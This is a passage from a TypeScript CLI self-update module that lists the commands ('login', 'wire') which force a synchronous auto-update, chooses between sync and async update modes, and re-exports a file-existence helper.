 * (e.g. `alter login` consuming an auth-code on a buggy old build). These
 * trigger sync auto-update.
 */
export const SYNC_GATED_COMMANDS = new Set<string>(["login", "wire"]);

export function pickMode(command: string | undefined): "sync" | "async" {
  if (command && SYNC_GATED_COMMANDS.has(command)) return "sync";
  return "async";
}

// Used so dist-only consumers can find this module's directory if needed.
export const SELF_UPDATE_MODULE_PATH = fileURLToPath(import.meta.url);

// Defensive `existsSync` re-export used by callers that want to assert their
// install path before triggering sync update - exporting from this module
// keeps the import surface small.
export { existsSync as fileExists };
